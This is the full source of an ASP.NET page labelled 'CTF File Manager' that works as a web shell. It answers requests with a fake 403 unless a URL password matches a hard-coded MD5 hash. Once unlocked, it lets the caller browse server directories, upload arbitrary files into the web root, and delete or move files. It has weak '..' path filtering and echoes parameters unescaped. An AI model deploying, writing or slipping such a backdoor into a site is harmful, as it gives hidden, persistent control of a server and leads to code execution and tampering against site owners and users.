<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Linq" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">
    string correctMD5 = "e662ddd93d6f72abfb31328821b595cc"; 

    string currentPath = "";

    protected void Page_Load(object sender, EventArgs e)
    {
        string inputPass = Request.QueryString["p"];

        // === PASSWORD CHECK ===
        if (string.IsNullOrEmpty(inputPass) || !VerifyMD5(inputPass, correctMD5))
        {
            Response.StatusCode = 403;
            Response.StatusDescription = "Forbidden";
            Response.Write("<h1>403 Forbidden</h1>");
            Response.End();
        }

        // Password is correct → continue
        currentPath = Request.QueryString["dir"] ?? "";
        currentPath = currentPath.Trim('/', '\\').Replace("..", "").Replace("\\", "/");

        // Handle Delete
        if (!string.IsNullOrEmpty(Request.QueryString["del"]))
        {
            DeleteFile(Request.QueryString["del"]);
        }

        // Handle Move
        if (Request.QueryString["action"] == "move" && !string.IsNullOrEmpty(Request.QueryString["target"]))
        {
            MoveFile(Request.QueryString["target"], Request.QueryString["dest"]);
        }

        if (Request.QueryString["msg"] == "ok")
            lblMsg.Text = "<span style='color:lime'>✅ Success!</span>";
    }

    bool VerifyMD5(string input, string correctHash)
    {
        using (MD5 md5 = MD5.Create())
        {
            byte[] hashBytes = md5.ComputeHash(Encoding.UTF8.GetBytes(input));
            StringBuilder sb = new StringBuilder();
            foreach (byte b in hashBytes) sb.Append(b.ToString("x2"));
            return sb.ToString().Equals(correctHash, StringComparison.OrdinalIgnoreCase);
        }
    }

    string GetFullPhysicalPath(string relative)
    {
        string path = "~/" + currentPath;
        if (!string.IsNullOrEmpty(currentPath)) path += "/";
        return Server.MapPath(path + relative);
    }

    void DeleteFile(string fileName)
    {
        try
        {
            string path = GetFullPhysicalPath(Server.UrlDecode(fileName));
            if (File.Exists(path)) File.Delete(path);
        }
        catch { }
    }

    void MoveFile(string sourceFile, string destFolder)
    {
        try
        {
            string source = GetFullPhysicalPath(Server.UrlDecode(sourceFile));
            string destDir = GetFullPhysicalPath(Server.UrlDecode(destFolder));
            string dest = Path.Combine(destDir, Path.GetFileName(source));

            if (File.Exists(source) && Directory.Exists(destDir))
                File.Move(source, dest);
        }
        catch { }
    }

    protected void btnUpload_Click(object sender, EventArgs e)
    {
        if (FileUpload1.HasFile)
        {
            try
            {
                string fileName = Path.GetFileName(FileUpload1.FileName);
                string savePath = GetFullPhysicalPath(fileName);
                FileUpload1.SaveAs(savePath);
                Response.Redirect("?p=" + Request.QueryString["p"] + "&dir=" + Server.UrlEncode(currentPath) + "&msg=ok");
            }
            catch { }
        }
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <style>
        body { font-family: Consolas, monospace; background: #0a0a0a; color: #00ff00; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #00aa00; padding: 10px; }
        th { background: #111; }
        a { color: #00ffff; text-decoration: none; }
        a:hover { color: white; }
        .dir { color: #ffff00; font-weight: bold; }
        .current-path { background:#111; padding:10px; border:1px solid #00ff00; margin:10px 0; }
        .actions a { margin-right: 15px; }
        .upload-box, .move-box { border: 2px dashed #00ff00; padding: 15px; background: #111; margin:15px 0; }
    </style>
</head>
<body>
    <h1>🛠️ CTF File Manager</h1>

    <div class="current-path">
        <strong>Path:</strong> /<%= currentPath %> 
        <a href="?p=<%= Request.QueryString["p"] %>">[ Root ]</a>
    </div>

    <!-- Upload -->
    <div class="upload-box">
        <h2>Upload File</h2>
        <form runat="server" enctype="multipart/form-data">
            <asp:FileUpload ID="FileUpload1" runat="server" />
            <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
            <asp:Label ID="lblMsg" runat="server" />
        </form>
    </div>

    <h2>📁 Directory Listing</h2>
    <table>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Modified</th>
            <th>Actions</th>
        </tr>

        <% 
            string physicalPath = Server.MapPath("~/" + currentPath);
            
            // Parent Directory
            if (!string.IsNullOrEmpty(currentPath))
            {
                string parent = currentPath.Contains("/") ? currentPath.Substring(0, currentPath.LastIndexOf("/")) : "";
        %>
        <tr>
            <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(parent) %>">.. (Go Up)</a></td>
            <td>Folder</td>
            <td></td>
            <td></td>
            <td></td>
        </tr>
        <% } %>

        <% 
            // Folders
            foreach (var dir in Directory.GetDirectories(physicalPath).Select(d => new DirectoryInfo(d)).OrderBy(d => d.Name))
            {
                string dirName = dir.Name;
                string newPath = string.IsNullOrEmpty(currentPath) ? dirName : currentPath + "/" + dirName;
        %>
        <tr>
            <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(newPath) %>"><%= dirName %></a></td>
            <td>Folder</td>
            <td>-</td>
            <td><%= dir.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td>
            <td></td>
        </tr>
        <% } %>

        <% 
            // Files
            var files = Directory.GetFiles(physicalPath).Select(f => new FileInfo(f)).OrderBy(f => f.Name);
            foreach (var file in files)
            {
                string fileName = file.Name;
                string encoded = Server.UrlEncode(fileName);
        %>
        <tr>
            <td><%= fileName %></td>
            <td>File</td>
            <td><%= (file.Length / 1024.0).ToString("0.##") %> KB</td>
            <td><%= file.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td>
            <td class="actions">
                <a href="<%= string.IsNullOrEmpty(currentPath) ? "" : currentPath + "/" %><%= fileName %>" download>⬇️ Download</a>
                <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(currentPath) %>&del=<%= encoded %>" 
                   onclick="return confirm('Delete this file?')">🗑️ Delete</a>
                <a href="javascript:void(0)" onclick="moveFile('<%= encoded %>')">🔀 Move</a>
            </td>
        </tr>
        <% } %>
    </table>

    <!-- Move Form -->
    <div class="move-box" id="moveForm" style="display:none;">
        <h2>Move File</h2>
        <form method="get">
            <input type="hidden" name="p" value="<%= Request.QueryString["p"] %>" />
            <input type="hidden" name="dir" value="<%= currentPath %>" />
            <input type="hidden" name="action" value="move" />
            <input type="hidden" id="source" name="target" />
            
            Move to: <input type="text" name="dest" placeholder="folder or ../folder" style="width:320px;padding:6px;"/>
            <input type="submit" value="Move" />
            <button type="button" onclick="document.getElementById('moveForm').style.display='none'">Cancel</button>
        </form>
    </div>

    <script>
        function moveFile(filename) {
            document.getElementById('source').value = filename;
            document.getElementById('moveForm').style.display = 'block';
        }
    </script>
</body>
</html>
